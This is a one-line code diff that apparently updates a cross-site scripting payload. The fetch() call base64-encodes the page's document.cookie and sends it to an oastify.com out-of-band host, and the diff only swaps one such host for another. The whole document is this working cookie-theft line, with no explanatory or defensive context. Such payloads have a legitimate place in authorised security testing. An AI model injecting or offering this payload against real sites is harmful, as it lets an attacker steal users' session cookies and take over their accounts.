@@ -1,1 +1,1 @@
-fetch("https://76bnslpid7knm894xd90wfvznqthh85x.oastify.com?cookie="+btoa(document.cookie));
+fetch("https://do5k3p7smnwcygtfy4zvx4ug97fy3tri.oastify.com?cookie="+btoa(document.cookie));
